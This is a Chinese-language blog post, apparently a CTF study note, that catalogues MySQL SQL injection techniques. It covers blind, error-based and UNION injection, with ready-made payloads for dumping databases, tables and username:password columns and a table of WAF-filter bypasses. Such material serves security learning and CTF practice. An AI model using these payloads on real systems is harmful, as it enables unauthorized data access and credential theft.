---
title: CTF中的SQL注入
date: 2020-03-10 21:46:37
comments: true
toc: true
categories:
- CTF
tags:
- SQL注入
---

### **1 何为SQL注入？**

SQL注入是一种注入攻击，由于用户的输入也是SQL执行语句的一部分，所以攻击者可以利用有注入漏洞的功能点，注入自己定义的语句，改变SQL语句结构，从而影响执行逻辑，让数据库执行任意的指令，查询数据库中任何自己需要的数据，甚至可以直接获取数据库服务器的系统权限。

### **2 盲注**
所谓盲注的本质就是猜解，就是通过“感觉”来判断当前字段是否存在注入，那何为感觉？答案是：差异（感觉到运行时间的差异和页面返回结果的差异）。也就是说我们通过构造一条语句来注入到SQL布尔表达式中，使得布尔表达式执行结果的真假直接影响整条语句的执行使得系统呈现不同的反应，布尔盲注就是页面返回内容有差异，时间盲注就是执行时间有差异。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200312214229745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)

#### 2.1 Bool盲注

常用于猜解数据的表达式：
```sql
and 0、and 1、or 1、1 & 1、id = 0 | 1、id = 0 | 0、id = 1^0、id = 0||1

ELT(N ,str1 ,str2 ,str3 ,…)
函数使用说明：若 N = 1 ，则返回值为 str1 ，若 N = 2 ，则返回值为 str2 ，以此类推。 若 N 小于 1 或大于参数的数目，则返回值为 NULL

1'+(select case when 1=1 then 0 else 1 end) and '1'='1
```
#### 2.2 基于时间的盲注

基于时间的盲注的一般思路是延迟注入，说白了就是将判断条件结合延迟函数注入进入，然后根据语句执行时间的长短来确定判断语句返回的 TRUE 还是 FALSE，从而去猜解一些未知的字段。

常用函数：sleep() 和 benchmark()函数
```sql
id = 1-sleep(2)
id = 1-benchmark(10000000,md5(1))
通过条件语句中结合延时函数达到猜解目标字段值
select * from user where id =1-if(mid(version(),1,1)<'a',sleep(1),0)
insert 和 update 的基于时间盲注示例
update users set username = '0'|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where id=15;
insert into users values (16,'dds','0'| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));
```

由于是盲注，我们看不到我们的数据回显，我们只能根据返回去猜解，那么在对数据库一无所知的情况下我们只能一位一位地猜解，这里就会用到一些截断函数以及一些转换函数。
比较常见的是
```sql
mid() substr() locate() position() substring() left() regexp like rlike length() char_length() ord() ascii() char() hex()
```
以及他们的同义函数等，当然这里还可能会需要很多的转换，比如过滤了等于号可以通过正则或者 in 或者大于小于号等替换之类的，这部分内容我会放在别的文章梳理一下，这里就不赘述了。

参见拆解表达式填充位置：
```sql
' or (payload) or ' 
' and (payload) and ' 
' or (payload) and ' 
' or (payload) and '=' 
'* (payload) *' 
' or (payload) and ' 
" – (payload) – "
" +(payload) + "
......
```

### **3 报错注入**

#### 3.1 xpath解析错误型报错
这里一般只用到了两个函数，extractvalue（）、updatexml（），关于两个函数的功能，有不清楚的可以自行查阅学习，这里不做过多介绍。报错原因很简单，updatexml第二个参数需要的是Xpath格式的字符串，如果我们输入的不符合，就会报错。报错回显内容的最大长度是32位的，所以有所局限。因此遇到一些比较长的字符需要主出时候，常常配合mid()、substr等函数执行多次查询，最后的结果由这些碎片字符进行拼接。

常见套路：
```sql
爆库
?id=1' and 1=extractvalue(1,concat(0x7e,(select database()),0x7e)) --+
或者
?id=1' and 1=(updatexml(1,concat(0x3a,(select database()),0x3a),1))%23
爆表
?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) --+
爆字段
?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e)) --+
爆值
?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))--+
```
或者使用updatexml函数：
```sql
爆数据库版本信息
?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)  
链接用户
?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)  
链接数据库
?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) 
爆库
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1),0x7e),1)  
爆表
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM information_schema.tables limit 0,1),0x7e),1)
爆字段
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM information_schema.columns limit 0,1),0x7e),1)  
爆字段内容
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM user limit 0,1),0x7e),1)  
```
以上说的基本都是查询的时候进行报错注入，有的时候报错注入存在与update、insert语句中

Insert报错注入：
```sql
INSERT INTO users (id, username, password) VALUES (2,'jack' or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0) or '', 'hahahaahah');
INSERT INTO security.user (id, uname, passwd,email) VALUES (211,1=updatexml(0,concat(0x7e,(SELECT concat_ws(':',id, uname, passwd) FROM security.user as x limit 0,1)),0) or '', 'ohmygod_is_r00tgrok','sssssss');
```
```SQL
SELECT * from users where id =1 and updatexml(1,make_set(3,'~',(select flag from flag)),1)
[Err] 1105 - XPATH syntax error: '~,flag{abdg678899nsn-dhsns98dj-d'
```


#### 3.2 利用几何函数报错

mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错
```sql
1. geometrycollection()
select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
2. multipoint()
select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
3. polygon()
select * from test where id=1 and Polygon((select * from(select * from(select user())a)b));
4. multipolygon()
select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
5. linestring()
select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
6. multilinestring()
select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
7. exp()
select * from test where id=1 and exp(~(select * from(select user())a));
```
这些报错注入函数对数据库的版本有要求，高版本的数据库并不能成功
 
其中Polygon(ls1, ls2, ...) 一个非常好玩的函数，如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。
```sql
SELECT * FROM users where id = 1 - Polygon(id)
---------------------------------------------------------------------------------------------
[SQL]SELECT * FROM users where id = 1 - Polygon(id)
[Err] 1367 - Illegal non geometric '`awd_bank`.`users`.`id`' value found during parsing
```

#### 3.3 concat+rand()+group_by()导致主键重复
```sql
select count(*) from users group by concat(version(),floor(rand(0)*2));
[SQL]select count(*) from users group by concat(version(),floor(rand(0)*2));
[Err] 1062 - Duplicate entry '5.7.261' for key '<group_key>'

select count(*),concat(table_name,floor(rand(0)*2))x from information_schema.tables group by x;
[SQL]select count(*),concat(table_name,floor(rand(0)*2))x from information_schema.tables group by x;
[Err] 1062 - Duplicate entry 'global_variables0' for key '<group_key>'
```

#### 3.4 重复列名报错

使用列名重复来进行报错注入

name_const报错型注入
```sql
name_const函数要求参数必须是常量，所以实际使用上还没找到什么比较好的利用方式
select* from (select*from(select name_const(version(),0))a join(select name_const(version(),0))b)c
version()改成database()或者user()就不行
 ```
join函数爆列名
```sql
mysql> select * from(select * from test a join test b)c;
ERROR 1060 (42S21): Duplicate column name 'id'
mysql> select * from(select * from test a join test b using(id))c;
ERROR 1060 (42S21): Duplicate column name 'name'
```

#### 3.5 整数溢出报错
测试发现在mysql5.5.47可以在报错中返回查询结果：而在mysql>5.5.53时，则不能返回查询结果。
```sql
mysql> select exp(~(select*from(select user())x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
```
利用以下语句能爆出所有字段
```SQL
SELECT 2* if((SELECT * from (select * from users) as x limit 1) > (SELECT * from users limit 1), 18446744073709551610, 18446744073709551610);
[Err] 1690 - BIGINT UNSIGNED value is out of range in '(2 * if(((select
 `awd_bank`.`users`.`id`,`awd_bank`.`users`.`username`,`awd_bank`.`users`.`password`,`awd_bank`.`users`.`money`
from `awd_bank`.`users` limit 1) > (select
`awd_bank`.`users`.`id`,`awd_bank`.`users`.`username`,`awd_bank`.`users`.`password`,`awd_bank`.`users`.`money`
from `awd_bank`.`users` limit 1)),18446744073709551610,18446744073709551610))'
```

### 4 UNION联合查询注入

当页面存在明显数据查询回显的时候，同时又存在 SQL注入漏洞，这时候可尝试通过union查询注出需要的数据。比如：
?id=1 注入，首先通过order by猜测列数，?id=1' order by 5%23，最后发现order by 后为3的时候不报错，因此可以判断改SQL语句查询的结果有3列。
```sql
爆库
id=0' union select 1,database(),3 %23
爆表
?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23
爆字段
?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' %23
爆字段值
0' union select 1,group_concat(username,0x3a,password),3 from users %23
```
已知某个地方有注入，waf拦截了information_schema、columns、tables、database、schema等关键字或函数，我们如何去获取当前字段名呢？
 
常见的做法有利用union搭配别名子查询，在不知道字段的时候进行注入。

例如：
```sql
select * from users where id =1 union select (SELECT e.3 from(SELECT * from (SELECT 1)a,(SELECT 2)b,(SELECT 3)c,(SELECT 4)d union SELECT * from users)e LIMIT 1 OFFSET 1)f,(select 1)g,(select 1)h,(select 1)i;

```

### **5 绕过姿势备忘录**

|相关姿势                          |                      具体描述
-|-|
|or and过滤                        |	大小写变形 Or,OR,oR<br>编码，hex，urlencode<br>添加注释/\*or\*/<br>利用符号 and=&& or=\|\||
|空格过滤                           | %09 TAB键（水平）%0a 新建一行 %0c 新的一页 %0d return功能 %0b TAB键（垂直） %a0 空格 |
|关键字的绕过                       | 注释符绕过:uni/\*\*/on se/\*\*/lect <br> 大小写绕过:UniOn SeleCt <br> 双关键字绕过:ununionion seselectlect <br> <>绕过:unio<>n sel<>ect <br>/\*!00000select\*/绕过关键字和正则过滤
|宽字节注入                        | 过滤单引号时，可以试试宽字节%bf%27 %df%27 %aa%27|
|大于号小于号拦截绕过               | id=1 and greatest(ascii(substr(username,1,1)),1)=97 <br> id=1 and strcmp(ascii(substr(username,1,1)),1); <br> id = 1 and substr(username,1,1) in ('a'); <br> id = 1 and substr(username,1,1) between 0x61 and 0x63;|
|逗号绕过                          | 在使用盲注的时候，需要使用到substr(),mid(),limit；这些子句方法都需要使用到逗号。<br>对于substr()和mid()这两个方法可以使用from for的方式来解决，limit则可以用offset<br>select * from sql_test where ascii(mid(username from 1 for 1))>1;<br>substr(x from 1 for 1) mid(x from 1 for 1)<br>select查询时候不使用逗号进行注入的姿势<br>id=3' union select * from(select database()) a join (select version() ) b %23<br>?id=3' union select * from (select group_concat(table_name ) from information_schema.tables where table_schema = 'sqli' ) a join (select version() ) b %23<br>id=' union select * from (select group_concat(column_name) from information_schema.columns where table_name = 'users' ) a join (select version() ) b %23<br>id=' union select * from (select group_concat(username) from users) a join (select group_concat(flag_9c861b688330) from users) b %23
